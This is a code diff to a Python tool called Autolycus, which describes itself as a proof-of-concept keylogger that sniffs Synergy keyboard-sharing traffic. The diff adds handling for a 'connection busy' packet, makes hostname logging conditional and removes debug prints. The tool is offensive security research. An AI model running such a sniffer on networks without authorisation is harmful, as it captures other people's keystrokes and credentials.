@@ -33,7 +33,8 @@ class Autolycus(object):
         "UNKNOWN": "unknown",
         "LEAVING_SCREEN": "cout",
         "ENTERING_SCREEN": "cinn",
-        "CLOSE_CONNECTION": "cbye"
+        "CLOSE_CONNECTION": "cbye",
+        "CONNECTION_BUSY": "ebsy"
     }
 
     # non-ASCII keycodes
@@ -141,6 +142,8 @@ class Autolycus(object):
                     self.handle_leaving_screen(packet)
                 elif packet_type == self.PACKET["CLOSE_CONNECTION"]:
                     self.handle_close(packet)
+                elif packet_type == self.PACKET["CONNECTION_BUSY"]:
+                    self.handle_busy(packet)
                 elif len(packet.synergy.field_names) > 0:
                     packet.synergy.pretty_print()
                     print(packet.synergy.field_names)
@@ -152,7 +155,8 @@ class Autolycus(object):
         if ({packet.ip.src, packet.ip.dst}.issubset(self.active_connections)):
             self.log.log(self.HDSHK, f"Connection established between {packet.ip.dst} <-> {packet.ip.src}")
             self.log.log(self.HDSHK, f"\tServer: {packet.ip.dst}")
-            self.log.log(self.HDSHK, f"\tClient: {packet.ip.src}, hostname: {packet.synergy.handshake_client}")
+            extras = f", hostname: {packet.synergy.handshake_client}" if "handshake_client" in packet.synergy.field_names else ""
+            self.log.log(self.HDSHK, f"\tClient: {packet.ip.src}{extras}")
 
     def handle_query_info(self, packet):
         self.log.log(self.SETUP, f"{packet.ip.src} is requesting screen settings")
@@ -237,10 +241,11 @@ class Autolycus(object):
         self.log.log(self.INFO, f"({packet.ip.src} -> {packet.ip.dst}) leaving screen")
 
     def handle_close(self, packet):
-        print(self.active_connections)
         self.log.log(self.CLOSE, f"{packet.ip.src} -> {packet.ip.dst} closing connection")
         self.active_connections -= {packet.ip.src, packet.ip.dst}
-        print(self.active_connections)
+
+    def handle_busy(self, packet):
+        self.log.log(self.CONN, f"{packet.ip.src} -> {packet.ip.dst} attempting connection to busy recipient")
 
     def print_banner(self):
         BANNER_WIDTH = 115
@@ -277,7 +282,6 @@ class Autolycus(object):
         logger.addHandler(handler)
         logger.setLevel("HDSHK")
         return logger
-
 
 def main():
     parser = argparse.ArgumentParser(description="A proof of concept keylogger for the Synergy protocol.")
